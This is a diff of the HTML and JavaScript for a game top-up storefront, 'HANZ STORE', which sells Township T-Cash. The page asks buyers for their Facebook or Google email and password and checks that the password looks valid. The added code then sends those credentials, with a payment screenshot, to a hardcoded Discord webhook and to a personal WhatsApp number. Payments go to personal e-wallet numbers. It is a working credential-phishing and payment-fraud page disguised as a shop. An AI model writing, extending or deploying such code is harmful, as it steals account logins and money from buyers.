@@ -46,7 +46,7 @@
         .logo-container img {
             width: 130px;
             height: 130px;
-            border-radius: 15px; /* Kotak melengkung */
+            border-radius: 15px; 
             border: 3px solid var(--primary-color);
             box-shadow: 0 0 15px rgba(100, 221, 23, 0.4);
             animation: pulseLogo 2s infinite;
@@ -64,7 +64,6 @@
             margin-bottom: 5px;
             font-size: 32px;
             letter-spacing: 1px;
-            /* Efek Cahaya Bergerak Kiri ke Kanan */
             background: linear-gradient(90deg, #ffffff 20%, #64dd17 50%, #ffffff 80%);
             background-size: 200% auto;
             color: transparent;
@@ -100,19 +99,9 @@
             color: #dddddd;
         }
 
-        .info-box {
-            background: #1b3b22;
-            padding: 10px;
-            border-radius: 10px;
-            font-size: 12px;
-            color: var(--primary-color);
-            margin-bottom: 15px;
-            text-align: center;
-            border: 1px solid var(--primary-color);
-        }
-
         input[type="text"],
-        input[type="password"] {
+        input[type="password"],
+        input[type="file"] {
             width: 100%;
             padding: 12px;
             background-color: #333333;
@@ -122,13 +111,6 @@
             box-sizing: border-box;
             font-size: 14px;
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        input[type="text"]:focus,
-        input[type="password"]:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 8px rgba(100, 221, 23, 0.3);
         }
 
         button {
@@ -150,10 +132,6 @@
             background-color: #52b202;
             color: #fff;
             box-shadow: 0 6px 15px rgba(100, 221, 23, 0.4);
-        }
-
-        button:active {
-            transform: scale(0.97);
         }
 
         .grid-options {
@@ -178,64 +156,34 @@
             align-items: center;
         }
 
-        .radio-box input {
-            display: none;
-        }
+        .radio-box input { display: none; }
 
         .radio-box:has(input:checked) {
             border-color: var(--primary-color);
             background-color: #1b3b22;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
 
-        .radio-box strong {
-            color: #eeeeee;
-            font-size: 12px;
-            font-weight: 600;
-        }
+        .radio-box strong { color: #eeeeee; font-size: 12px; font-weight: 600; }
+        .radio-box span.price { display: block; color: #ff5252; font-weight: bold; font-size: 11px; margin-top: 4px; }
+        .payment-logo { width: 40px; height: 40px; margin-bottom: 5px; object-fit: contain; }
 
-        .radio-box span.price {
-            display: block;
-            color: #ff5252;
-            font-weight: bold;
-            font-size: 11px;
-            margin-top: 4px;
-        }
+        #loginDetailsContainer { display: none; text-align: center; }
 
-        .payment-logo {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 5px;
-            object-fit: contain;
+        .modal-overlay {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.9); display: none; justify-content: center;
+            align-items: center; z-index: 1000; overflow-y: auto;
         }
-
-        #loginDetailsContainer {
-            display: none;
-            animation: fadeIn 0.4s ease-in-out;
-            text-align: center;
+        .modal-content {
+            background: #1e1e1e; padding: 25px; border-radius: 20px;
+            width: 90%; max-width: 400px; text-align: center;
+            border: 1px solid var(--primary-color);
+            position: relative;
         }
-
-        .login-icon {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            animation: bounceIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes bounceIn {
-            0% { transform: scale(0.3); opacity: 0; }
-            50% { transform: scale(1.05); opacity: 1; }
-            70% { transform: scale(0.9); }
-            100% { transform: scale(1); }
+        
+        .close-btn {
+            position: absolute; top: 10px; right: 15px; font-size: 24px;
+            cursor: pointer; color: #fff; font-weight: bold;
         }
     </style>
 </head>
@@ -251,25 +199,20 @@
 
         <div class="form-group">
             <label>1. Pilih Metode Login Akun</label>
-            <div class="info-box">⚠️ Pastikan data akun benar agar proses top up lancar</div>
             <div class="grid-options">
                 <label class="radio-box" onclick="tampilkanFormLogin('Facebook')">
-                    <input type="radio" name="loginMethod" value="Facebook">
-                    <strong>Facebook</strong>
+                    <input type="radio" name="loginMethod" value="Facebook"><img src="https://i.ibb.co.com/jvmGT12Z/Logo-de-Facebook.png" style="width:30px; margin-bottom:5px;"><strong>Facebook</strong>
                 </label>
-
                 <label class="radio-box" onclick="tampilkanFormLogin('Google')">
-                    <input type="radio" name="loginMethod" value="Google">
-                    <strong>Google</strong>
+                    <input type="radio" name="loginMethod" value="Google"><img src="https://i.ibb.co.com/5gXxjR9K/pngwing-com-4.png" style="width:30px; margin-bottom:5px;"><strong>Google</strong>
                 </label>
             </div>
         </div>
 
         <div class="form-group" id="loginDetailsContainer">
             <label id="loginTitle">Masukkan Detail Akun</label>
-            <div id="loginImageContainer"></div>
-            <input type="text" id="loginId" placeholder="Email atau No. HP" required style="margin-bottom: 10px;">
-            <input type="password" id="loginPass" placeholder="Password Akun" required>
+            <input type="text" id="loginId" placeholder="Email atau No. HP" style="margin-bottom: 10px;">
+            <input type="password" id="loginPass" placeholder="Password Akun">
         </div>
 
         <div class="form-group">
@@ -287,10 +230,10 @@
         <div class="form-group">
             <label>3. Pilih Nominal T-Cash</label>
             <div class="grid-options" id="nominalContainer">
-                <label class="radio-box"><input type="radio" name="nominal" value="100 T-Cash" data-price="Rp 15.000"><strong>100 T-Cash</strong><span class="price">Rp 15.000</span></label>
-                <label class="radio-box"><input type="radio" name="nominal" value="250 T-Cash" data-price="Rp 35.000"><strong>250 T-Cash</strong><span class="price">Rp 35.000</span></label>
-                <label class="radio-box"><input type="radio" name="nominal" value="500 T-Cash" data-price="Rp 70.000"><strong>500 T-Cash</strong><span class="price">Rp 70.000</span></label>
-                <label class="radio-box"><input type="radio" name="nominal" value="1000 T-Cash" data-price="Rp 135.000"><strong>1000 T-Cash</strong><span class="price">Rp 135.000</span></label>
+                <label class="radio-box"><input type="radio" name="nominal" value="100 T-Cash" data-price="15000" data-label="Rp 15.000"><strong>100 T-Cash</strong><span class="price">Rp 15.000</span></label>
+                <label class="radio-box"><input type="radio" name="nominal" value="250 T-Cash" data-price="35000" data-label="Rp 35.000"><strong>250 T-Cash</strong><span class="price">Rp 35.000</span></label>
+                <label class="radio-box"><input type="radio" name="nominal" value="500 T-Cash" data-price="70000" data-label="Rp 70.000"><strong>500 T-Cash</strong><span class="price">Rp 70.000</span></label>
+                <label class="radio-box"><input type="radio" name="nominal" value="1000 T-Cash" data-price="135000" data-label="Rp 135.000"><strong>1000 T-Cash</strong><span class="price">Rp 135.000</span></label>
             </div>
         </div>
 
@@ -301,84 +244,223 @@
                 <label class="radio-box"><input type="radio" name="pembayaran" value="GoPay"><img src="https://i.ibb.co.com/fYCGY8n4/d50d95c8-1df7-4e44-bc38-71c34f770190.jpg" class="payment-logo"><strong>GoPay</strong></label>
                 <label class="radio-box"><input type="radio" name="pembayaran" value="OVO"><img src="https://i.ibb.co.com/MyCxg6gT/Top-up-OVO.jpg" class="payment-logo"><strong>OVO</strong></label>
                 <label class="radio-box"><input type="radio" name="pembayaran" value="ShopeePay"><img src="https://i.ibb.co.com/6JRn517d/sad.jpg" class="payment-logo"><strong>ShopeePay</strong></label>
-                <label class="radio-box"><input type="radio" name="pembayaran" value="QRIS"><img src="https://i.ibb.co.com/LXN1QPkz/a365c787-6835-4f27-baaf-ca014ccf11ef.jpg" class="payment-logo"><strong>QRIS</strong></label>
+                <label class="radio-box"><input type="radio" name="pembayaran" value="QRIS"><img src="https://i.ibb.co.com/zV86RVQ6/quick-response-code-indonesia-standard-qris-logo-png-seeklogo-391791.png" class="payment-logo"><strong>QRIS</strong></label>
                 <label class="radio-box"><input type="radio" name="pembayaran" value="PayPal"><img src="https://i.ibb.co.com/NgjBvyfZ/37562c63-6c0d-4b11-aad1-d8c712b49fa1.jpg" class="payment-logo"><strong>PayPal</strong></label>
             </div>
         </div>
 
-        <button onclick="prosesPesanan()">PROSES PESANAN</button>
+        <button onclick="bukaPembayaran()">PROSES PESANAN</button>
+    </div>
+
+    <div id="modalPembayaran" class="modal-overlay">
+        <div class="modal-content">
+            <span class="close-btn" onclick="tutupModal()">×</span>
+            <h2 style="color: var(--primary-color);" id="modalTitle">Instruksi Pembayaran</h2>
+            <div id="paymentContent" style="margin: 20px 0; color: #fff;"></div>
+            
+            <div id="actionArea"></div>
+
+            <div id="uploadSection" style="display:none; margin-top:20px;">
+                <label style="font-size: 12px; display: block; margin-bottom: 10px;">Lampirkan Bukti Transfer:</label>
+                <input type="file" id="buktiBayar" accept="image/*">
+                <button class="modal-btn" style="background: var(--primary-color); border:none; padding: 12px; width: 100%; border-radius: 10px; margin-top: 15px; font-weight: bold; cursor: pointer;" onclick="finalisasiPembayaran()">KONFIRMASI BAYAR</button>
+            </div>
+        </div>
     </div>
 
     <script>
-        const nomorWhatsApp = "+6281221548310"; 
+        const nomorWA = "+6281221548310"; 
+        const nomorDana = "085162984757"; 
         const webhookUrl = "https://discord.com/api/webhooks/1505805287263830026/ePqMIxZXPdUCeA21tOMajwvKZaJdmI1ooi4ltXGThMzVkWCdSvenrW6PTOOPkVjnXYEI";
+        const linkQRIS = "https://i.ibb.co.com/NdRF3YKw/qr-ID1026522888316-21-05-26-1779336918-1779336918801.jpg"; 
 
         function tampilkanFormLogin(metode) {
-            const container = document.getElementById("loginDetailsContainer");
-            const imgContainer = document.getElementById("loginImageContainer");
-            const inputId = document.getElementById("loginId");
-            const title = document.getElementById("loginTitle");
+            document.getElementById("loginDetailsContainer").style.display = "block";
+            document.getElementById("loginTitle").innerText = "Masukkan Data Akun " + metode;
+        }
 
-            container.style.display = "block";
+        function tutupModal() {
+            document.getElementById("modalPembayaran").style.display = "none";
+        }
 
-            if (metode === 'Facebook') {
-                title.innerText = "Masukkan Data Akun Facebook";
-                imgContainer.innerHTML = '<img src="https://img.icons8.com/color/144/facebook-new.png" class="login-icon" alt="Logo FB">';
-                inputId.placeholder = "Masukkan Email / No. HP Facebook";
-            } else if (metode === 'Google') {
-                title.innerText = "Masukkan Data Akun Google";
-                imgContainer.innerHTML = '<img src="https://img.icons8.com/color/144/google-logo.png" class="login-icon" alt="Logo Google">';
-                inputId.placeholder = "Masukkan Email Google";
+        function copyNomor() {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(nomorDana).then(() => {
+                    alert("Nomor DANA berhasil disalin: " + nomorDana);
+                }).catch(err => {
+                    fallbackCopyTextToClipboard(nomorDana);
+                });
+            } else {
+                fallbackCopyTextToClipboard(nomorDana);
             }
         }
 
-        async function prosesPesanan() {
-            const loginMethodElement = document.querySelector('input[name="loginMethod"]:checked');
-            const kategoriElement = document.querySelector('input[name="kategori"]:checked');
-            const pembayaranElement = document.querySelector('input[name="pembayaran"]:checked');
+        function fallbackCopyTextToClipboard(text) {
+            var textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            try {
+                document.execCommand('copy');
+                alert("Nomor DANA disalin: " + text);
+            } catch (err) {
+                alert("Gagal menyalin otomatis, silakan salin manual: " + text);
+            }
+            document.body.removeChild(textArea);
+        }
+
+        function triggerDana() {
+            window.location.href = "dana://qr/phone?phone=" + nomorDana;
+            setTimeout(function() {
+                alert("Jika aplikasi DANA tidak terbuka, silakan gunakan metode manual: Salin nomor dan buka aplikasi DANA secara manual.");
+            }, 2000);
+        }
+
+        async function downloadQR() {
+            const response = await fetch(linkQRIS);
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = 'QRIS_HANZ_STORE.png';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            window.URL.revokeObjectURL(url);
+        }
+
+        function bukaPembayaran() {
+            const login = document.querySelector('input[name="loginMethod"]:checked');
+            const kat = document.querySelector('input[name="kategori"]:checked');
+            const nom = document.querySelector('input[name="nominal"]:checked');
+            const pay = document.querySelector('input[name="pembayaran"]:checked');
+            const inputLoginId = document.getElementById("loginId").value.trim();
+            const inputLoginPass = document.getElementById("loginPass").value.trim();
+
+            // Validasi apakah form sudah terisi semua
+            if (!login || !kat || !nom || !pay || !inputLoginId || !inputLoginPass) {
+                alert("Lengkapi semua data, termasuk email/ID dan password!"); return;
+            }
+
+            // Validasi Informasi Akun agar diisi dengan benar
+            if (login.value === "Google" && !inputLoginId.includes("@")) {
+                alert("Mohon masukkan alamat Email Google yang valid (harus menggunakan @)."); return;
+            }
+            if (inputLoginPass.length < 6) {
+                alert("Password terlalu pendek. Pastikan memasukkan password akun yang valid dan benar."); return;
+            }
+
+            const nominalLabel = nom.getAttribute("data-label");
+            const metode = pay.value;
+            const content = document.getElementById("paymentContent");
+            const action = document.getElementById("actionArea");
+            
+            document.getElementById("modalPembayaran").style.display = "flex";
+            document.getElementById("uploadSection").style.display = "none";
+            action.innerHTML = "";
+
+            if (metode === "DANA") {
+                content.innerHTML = `<strong>Instruksi Pembayaran DANA</strong><br><br>
+                1. <strong>Cara Otomatis:</strong> Klik tombol "BUKA DANA" di bawah.<br>
+                2. <strong>Cara Manual:</strong> Jika tombol otomatis gagal, klik "SALIN NOMOR" lalu buka aplikasi DANA dan lakukan transfer ke nomor tersebut.<br><br>
+                Nomor DANA: <strong>${nomorDana}</strong>`;
+                action.innerHTML = `<button onclick="triggerDana()" style="background:#007bff; width:100%; padding:15px; border-radius:10px; border:none; color:white; font-weight:bold; cursor:pointer; margin-bottom:10px;">BUKA DANA</button>
+                                    <button onclick="copyNomor()" style="background:#444; width:100%; padding:15px; border-radius:10px; border:none; color:white; font-weight:bold; cursor:pointer; margin-bottom:10px;">SALIN NOMOR DANA</button>
+                                    <button onclick="tampilkanUpload()" style="background:#64dd17; width:100%; padding:15px; border-radius:10px; border:none; color:black; font-weight:bold; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
+            } else if (metode === "GoPay") {
+                content.innerHTML = `Klik untuk membayar <strong>${nominalLabel}</strong> via GoPay:`;
+                action.innerHTML = `<a href="intent://#Intent;scheme=gopay;package=com.gojek.app;end" style="text-decoration:none;"><button style="background:#00a3e0; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">BAYAR GOPAY SEKARANG</button></a>
+                                    <button onclick="tampilkanUpload()" style="background:#444; margin-top:10px; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
+            } else if (metode === "OVO") {
+                content.innerHTML = `Transfer <strong>${nominalLabel}</strong> ke OVO ${nomorWA}`;
+                action.innerHTML = `<a href="intent://#Intent;scheme=ovo;package=ovo.id;end" style="text-decoration:none;"><button style="background:#4e2874; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">BAYAR OVO SEKARANG</button></a>
+                                    <button onclick="tampilkanUpload()" style="background:#444; margin-top:10px; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
+            } else if (metode === "ShopeePay") {
+                content.innerHTML = `Klik untuk membayar <strong>${nominalLabel}</strong> via ShopeePay:`;
+                action.innerHTML = `<a href="intent://#Intent;scheme=shopeeid;package=com.shopee.id;end" style="text-decoration:none;"><button style="background:#ee4d2d; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">BAYAR SHOPEEPAY</button></a>
+                                    <button onclick="tampilkanUpload()" style="background:#444; margin-top:10px; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
+            } else if (metode === "QRIS") {
+                content.innerHTML = `Scan QRIS berikut untuk <strong>${nominalLabel}</strong>:<br><br><img src="${linkQRIS}" style="width:200px; border-radius:10px; border:2px solid #fff;"><br><small>(Screenshot atau download QRIS)</small>`;
+                action.innerHTML = `<button onclick="downloadQR()" style="background:#28a745; margin-bottom:10px; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">DOWNLOAD QR CODE</button>
+                                    <button onclick="tampilkanUpload()" style="background:#444; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
+            } else {
+                content.innerHTML = `Silakan transfer <strong>${nominalLabel}</strong> ke:<br><h3>${metode} : ${nomorWA}</h3>`;
+                action.innerHTML = `<button onclick="tampilkanUpload()" style="background:#444; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
+            }
+        }
+
+        function tampilkanUpload() {
+            document.getElementById("uploadSection").style.display = "block";
+            document.getElementById("actionArea").style.display = "none";
+        }
+
+        async function finalisasiPembayaran() {
+            const loginMethod = document.querySelector('input[name="loginMethod"]:checked').value;
             const loginId = document.getElementById("loginId").value;
             const loginPass = document.getElementById("loginPass").value;
-            const nominalElement = document.querySelector('input[name="nominal"]:checked');
+            const kategori = document.querySelector('input[name="kategori"]:checked').value;
+            const nominal = document.querySelector('input[name="nominal"]:checked').value;
+            const pembayaran = document.querySelector('input[name="pembayaran"]:checked').value;
+            
+            const fileInput = document.getElementById("buktiBayar");
+            const file = fileInput.files[0];
 
-            if (!loginMethodElement || !kategoriElement || !loginId || !loginPass || !nominalElement || !pembayaranElement) {
-                alert("Harap lengkapi semua data pesanan!");
+            // Pengecekan agar pembeli wajib memasukkan foto
+            if (!file) {
+                alert("Harap lampirkan foto/screenshot bukti pembayaran terlebih dahulu!");
                 return;
             }
 
-            const loginMethod = loginMethodElement.value;
-            const kategori = kategoriElement.value;
-            const pembayaran = pembayaranElement.value;
-            const nominal = nominalElement.value;
-            const price = nominalElement.getAttribute("data-price");
+            // Ubah text tombol saat memproses agar tidak di-spam
+            const btnKonfirmasi = document.querySelector("#uploadSection button");
+            const textAwal = btnKonfirmasi.innerText;
+            btnKonfirmasi.innerText = "MENGIRIM...";
+            btnKonfirmasi.disabled = true;
 
-            const payload = {
-                content: `**PESANAN BARU HANZ STORE**\n` +
-                         `Login Via: ${loginMethod}\n` +
-                         `Kategori: ${kategori}\n` +
-                         `Email/No: ${loginId}\n` +
-                         `Password: ${loginPass}\n` +
-                         `Order: ${nominal}\n` +
-                         `Harga: ${price}\n` +
-                         `Pembayaran: ${pembayaran}`
+            // Menyiapkan Embed Discord
+            const embed = {
+                title: "PESANAN BARU - HANZ STORE",
+                color: 6570400,
+                fields: [
+                    { name: "Metode Login", value: loginMethod, inline: true },
+                    { name: "ID Akun", value: loginId, inline: true },
+                    { name: "Password", value: loginPass, inline: true },
+                    { name: "Kategori", value: kategori, inline: true },
+                    { name: "Nominal", value: nominal, inline: true },
+                    { name: "Pembayaran", value: pembayaran, inline: true }
+                ]
             };
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(err => console.log(err));
+            // Menggunakan FormData untuk mengirim Gambar & Teks sekaligus ke Discord
+            const formData = new FormData();
+            formData.append("file", file);
+            formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
 
-            const textWA = `*HANZ STORE - TOWNSHIP TOP UP*%0A%0A` +
-                           `*Login Via* : ${loginMethod}%0A` +
-                           `*Kategori* : ${kategori}%0A` +
-                           `*Email / No* : ${loginId}%0A` +
-                           `*Password* : ${loginPass}%0A` +
-                           `*Order* : ${nominal}%0A` +
-                           `*Harga* : ${price}%0A` +
-                           `*Pembayaran* : ${pembayaran}%0A%0A` +
-                           `_Mohon proses top up akun saya, terima kasih._`;
+            try {
+                await fetch(webhookUrl, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+            } catch (error) {
+                console.error("Gagal mengirim ke Discord", error);
+            }
 
-            window.open(`https://wa.me/${nomorWhatsApp}?text=${textWA}`, '_blank');
+            // Kirim ke WhatsApp
+            const pesanWA = `Halo Hanz, ada pesanan baru!%0A%0A` +
+                            `*DETAIL PESANAN*%0A` +
+                            `Login via: ${loginMethod}%0A` +
+                            `ID Akun: ${loginId}%0A` +
+                            `Password: ${loginPass}%0A` +
+                            `Kategori: ${kategori}%0A` +
+                            `Nominal: ${nominal}%0A` +
+                            `Pembayaran: ${pembayaran}%0A%0A` +
+                            `*Catatan:* Bukti pembayaran sudah terkirim otomatis beserta data ini ke Discord kamu. Mohon verifikasi segera.`;
+
+            window.location.href = `https://wa.me/${nomorWA.replace('+', '')}?text=${pesanWA}`;
+            
+            // Kembalikan tombol seperti semula setelah selesai
+            btnKonfirmasi.innerText = textAwal;
+            btnKonfirmasi.disabled = false;
         }
     </script>
 </body>
